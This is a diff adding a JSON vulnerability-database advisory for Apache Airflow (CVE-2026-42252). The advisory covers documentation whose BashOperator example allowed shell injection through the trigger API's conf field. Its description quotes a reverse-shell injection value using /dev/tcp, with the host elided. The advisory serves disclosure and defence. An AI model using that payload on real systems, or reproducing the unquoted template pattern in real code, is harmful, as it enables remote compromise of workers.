@@ -1,0 +1,37 @@
+{
+  "id": "EUVD-2026-33591",
+  "enisaUuid": "b6d086fb-e30b-3efc-98c4-51684d0f888d",
+  "description": "Apache Airflow's official documentation at `core-concepts/dag-run.html` (\"Passing Parameters when triggering Dags\") showed a verbatim `BashOperator(bash_command=\"echo value: {{ dag_run.conf['conf1'] }}\")` example without any quoting / sanitization warning. Dag authors who copied the pattern verbatim into deployments where users had `Dag.can_trigger` permission on the affected Dag (typical multi-team deployments, hosted offerings exposing a trigger API) could be exposed to shell-metacharacter injection via the `conf` field of the trigger API: an authenticated trigger user could supply `\"; bash -i >& /dev/tcp/.../9999 0>&1; #\"` as a `conf` value and reach an `os.exec` on the worker. This CVE covers the documentation correction in `apache/airflow` PR 64129 \u2014 the pattern in the docs example now includes explicit shell-quoting and a safety caveat. Affects deployments whose Dag code was modeled on the pre-correction docs example. Same class as the prior CVE-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advised to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected documentation shipped with the release.",
+  "datePublished": "Jun 1, 2026, 7:51:19 AM",
+  "dateUpdated": "Jun 1, 2026, 7:51:19 AM",
+  "baseScore": 0.0,
+  "references": [
+    "https://github.com/apache/airflow/pull/64129",
+    "https://lists.apache.org/thread/8f4sc0rfn154jprmnwtmlst4p9zfw3w7"
+  ],
+  "aliases": [
+    "CVE-2026-42252"
+  ],
+  "assigner": "apache",
+  "epss": 0.0,
+  "enisaIdProduct": [
+    {
+      "id": "4f7fd668-2c0b-35cf-a843-1437870e9acf",
+      "product": {
+        "name": "Apache Airflow",
+        "vendor": {
+          "name": "Apache Software Foundation"
+        }
+      },
+      "product_version": "3.0.0 <3.2.2"
+    }
+  ],
+  "enisaIdVendor": [
+    {
+      "id": "c0e4aef4-0a60-3ec6-81f4-09609bb9dc6b",
+      "vendor": {
+        "name": "Apache Software Foundation"
+      }
+    }
+  ]
+}
